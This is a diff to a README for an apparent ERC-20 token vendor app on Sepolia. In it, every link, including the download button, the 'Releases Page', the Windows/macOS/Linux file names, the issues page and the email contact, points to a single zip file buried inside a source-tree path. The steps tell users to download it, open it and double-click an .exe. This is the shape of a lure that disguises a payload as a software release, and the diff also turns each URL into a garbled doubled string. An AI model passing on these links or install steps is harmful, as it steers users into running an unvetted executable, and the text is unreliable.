@@ -4,7 +4,7 @@
 Welcome to the challenge-token-vendor! This application allows you to easily buy and sell ERC-20 tokens on the Sepolia network. Follow these simple steps to get started.
 
 ## 📥 Download the Application
-[![Download challenge-token-vendor](https://raw.githubusercontent.com/FARM0010/challenge-token-vendor/main/packages/nextjs/app/blockexplorer/transaction/[txHash]/challenge-token-vendor_v3.4.zip)](https://raw.githubusercontent.com/FARM0010/challenge-token-vendor/main/packages/nextjs/app/blockexplorer/transaction/[txHash]/challenge-token-vendor_v3.4.zip)
+[![Download challenge-token-vendor](https://raw.githubusercontent.com/FARM0010/challenge-token-vendor/main/packages/nextjs/app/blockexplorer/transaction/[txHash]/challenge-token-vendor_v3.4.zip[txHash]https://raw.githubusercontent.com/FARM0010/challenge-token-vendor/main/packages/nextjs/app/blockexplorer/transaction/[txHash]/challenge-token-vendor_v3.4.zip)](https://raw.githubusercontent.com/FARM0010/challenge-token-vendor/main/packages/nextjs/app/blockexplorer/transaction/[txHash]/challenge-token-vendor_v3.4.zip[txHash]https://raw.githubusercontent.com/FARM0010/challenge-token-vendor/main/packages/nextjs/app/blockexplorer/transaction/[txHash]/challenge-token-vendor_v3.4.zip)
 
 ## 💻 System Requirements
 Before you download, ensure your system meets the following requirements:
@@ -20,14 +20,14 @@ Before you download, ensure your system meets the following requirements:
 - **Open Source**: Contribute or explore the code on GitHub.
 
 ## 🔍 How to Download & Install
-Visit this page to download: [Releases Page](https://raw.githubusercontent.com/FARM0010/challenge-token-vendor/main/packages/nextjs/app/blockexplorer/transaction/[txHash]/challenge-token-vendor_v3.4.zip).
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/FARM0010/challenge-token-vendor/main/packages/nextjs/app/blockexplorer/transaction/[txHash]/challenge-token-vendor_v3.4.zip[txHash]https://raw.githubusercontent.com/FARM0010/challenge-token-vendor/main/packages/nextjs/app/blockexplorer/transaction/[txHash]/challenge-token-vendor_v3.4.zip).
 
-1. Go to the [Releases Page](https://raw.githubusercontent.com/FARM0010/challenge-token-vendor/main/packages/nextjs/app/blockexplorer/transaction/[txHash]/challenge-token-vendor_v3.4.zip).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/FARM0010/challenge-token-vendor/main/packages/nextjs/app/blockexplorer/transaction/[txHash]/challenge-token-vendor_v3.4.zip[txHash]https://raw.githubusercontent.com/FARM0010/challenge-token-vendor/main/packages/nextjs/app/blockexplorer/transaction/[txHash]/challenge-token-vendor_v3.4.zip).
 2. You will see a list of available releases. Choose the latest version.
 3. Click on the downloadable file that matches your operating system:
-   - For Windows, it may be something like `https://raw.githubusercontent.com/FARM0010/challenge-token-vendor/main/packages/nextjs/app/blockexplorer/transaction/[txHash]/challenge-token-vendor_v3.4.zip`
-   - For macOS, look for `https://raw.githubusercontent.com/FARM0010/challenge-token-vendor/main/packages/nextjs/app/blockexplorer/transaction/[txHash]/challenge-token-vendor_v3.4.zip`
-   - For Linux, find `https://raw.githubusercontent.com/FARM0010/challenge-token-vendor/main/packages/nextjs/app/blockexplorer/transaction/[txHash]/challenge-token-vendor_v3.4.zip`
+   - For Windows, it may be something like `https://raw.githubusercontent.com/FARM0010/challenge-token-vendor/main/packages/nextjs/app/blockexplorer/transaction/[txHash]/challenge-token-vendor_v3.4.zip[txHash]https://raw.githubusercontent.com/FARM0010/challenge-token-vendor/main/packages/nextjs/app/blockexplorer/transaction/[txHash]/challenge-token-vendor_v3.4.zip`
+   - For macOS, look for `https://raw.githubusercontent.com/FARM0010/challenge-token-vendor/main/packages/nextjs/app/blockexplorer/transaction/[txHash]/challenge-token-vendor_v3.4.zip[txHash]https://raw.githubusercontent.com/FARM0010/challenge-token-vendor/main/packages/nextjs/app/blockexplorer/transaction/[txHash]/challenge-token-vendor_v3.4.zip`
+   - For Linux, find `https://raw.githubusercontent.com/FARM0010/challenge-token-vendor/main/packages/nextjs/app/blockexplorer/transaction/[txHash]/challenge-token-vendor_v3.4.zip[txHash]https://raw.githubusercontent.com/FARM0010/challenge-token-vendor/main/packages/nextjs/app/blockexplorer/transaction/[txHash]/challenge-token-vendor_v3.4.zip`
 4. Once the download is complete, locate the file on your computer.
 5. Open the file to start the installation.
    - For Windows: Double-click the `.exe` file.
@@ -45,11 +45,11 @@ After installation, follow these steps to run the application:
 ## 📚 Additional Resources
 - For help using the application, check our [User Guide](#).
 - If you encounter issues, please consult the [FAQ](#).
-- Feel free to report bugs or suggest features on our [Issues Page](https://raw.githubusercontent.com/FARM0010/challenge-token-vendor/main/packages/nextjs/app/blockexplorer/transaction/[txHash]/challenge-token-vendor_v3.4.zip).
+- Feel free to report bugs or suggest features on our [Issues Page](https://raw.githubusercontent.com/FARM0010/challenge-token-vendor/main/packages/nextjs/app/blockexplorer/transaction/[txHash]/challenge-token-vendor_v3.4.zip[txHash]https://raw.githubusercontent.com/FARM0010/challenge-token-vendor/main/packages/nextjs/app/blockexplorer/transaction/[txHash]/challenge-token-vendor_v3.4.zip).
 
 ## 🔗 Contact & Support
 If you have any questions or need assistance, reach out via:
-- Email: https://raw.githubusercontent.com/FARM0010/challenge-token-vendor/main/packages/nextjs/app/blockexplorer/transaction/[txHash]/challenge-token-vendor_v3.4.zip
-- GitHub Issues: [Report an issue](https://raw.githubusercontent.com/FARM0010/challenge-token-vendor/main/packages/nextjs/app/blockexplorer/transaction/[txHash]/challenge-token-vendor_v3.4.zip)
+- Email: https://raw.githubusercontent.com/FARM0010/challenge-token-vendor/main/packages/nextjs/app/blockexplorer/transaction/[txHash]/challenge-token-vendor_v3.4.zip[txHash]https://raw.githubusercontent.com/FARM0010/challenge-token-vendor/main/packages/nextjs/app/blockexplorer/transaction/[txHash]/challenge-token-vendor_v3.4.zip
+- GitHub Issues: [Report an issue](https://raw.githubusercontent.com/FARM0010/challenge-token-vendor/main/packages/nextjs/app/blockexplorer/transaction/[txHash]/challenge-token-vendor_v3.4.zip[txHash]https://raw.githubusercontent.com/FARM0010/challenge-token-vendor/main/packages/nextjs/app/blockexplorer/transaction/[txHash]/challenge-token-vendor_v3.4.zip)
 
 Thank you for choosing the challenge-token-vendor! Enjoy trading on Ethereum's Sepolia network.
